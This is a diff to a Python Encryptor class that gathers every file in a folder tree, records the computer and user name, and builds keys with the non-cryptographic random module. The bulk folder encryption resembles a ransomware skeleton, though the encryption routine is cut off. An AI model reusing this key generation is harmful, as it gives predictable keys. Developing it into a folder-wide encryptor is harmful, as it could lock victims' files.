@@ -2,16 +2,17 @@
 This file contains the Encryptor class, and every methods linked to the encryption process
 """
 import random
+import string
 import FileFunctions as Folder
 
 class Encryptor():
     """
     This class allows you to encrypt data using a key
     Attributes :
-    - encrypted_extension: tuple
     - files_to_encrypt: list
     - encryption_key: str
     - commputer_name: str
+    - user_name: str
     - encryption_level: int
     - folder: str
     - recursive: bool
@@ -19,16 +20,17 @@ class Encryptor():
 
     def __init__(
             self,
-            encrypted_extensions: list,
-            encryption_level: int,
             computer_name: str,
+            user_name: str,
             folder: str,
-            recursive: bool = True
+            recursive: bool,
+            encryption_level: int = 64,
         ) -> None:
-        self.encrypted_extensions = encrypted_extensions
         self.encryption_level = encryption_level
         self.encryption_key = self.generate_encryption_key()
         self.computer_name = computer_name
+        self.user_name = user_name
+        self.folder = folder
         self.recursive = recursive
 
         # check if folder exists before setting it
@@ -37,22 +39,17 @@ class Encryptor():
         else:
             exit("The selected folder was not found, check path and permissions.")
 
-        self.files_to_encrypt = Folder.grab_files(self.folder, self.encrypted_extensions)
-    
+        self.files_to_encrypt = Folder.grab_files(self.folder, self.recursive)
+
     def generate_encryption_key(self):
         """
         This function generates an encryption key
         """
-        key = ''
-        byte_list = ''
-        for byte in range(0x00, 0xFF): # all 8 bit combination
-            byte_list += (chr(byte))
-        for _ in range(self.encryption_level):
-            key += random.choice(byte_list)
-
+        characters = string.ascii_letters + string.digits  # a-zA-Z0-9
+        key = ''.join(random.choice(characters) for _ in range(self.encryption_level))
         self.encryption_key = key
         return key
-    
+
     def encrypt_files(self):
         """
         This function encrypts specified files
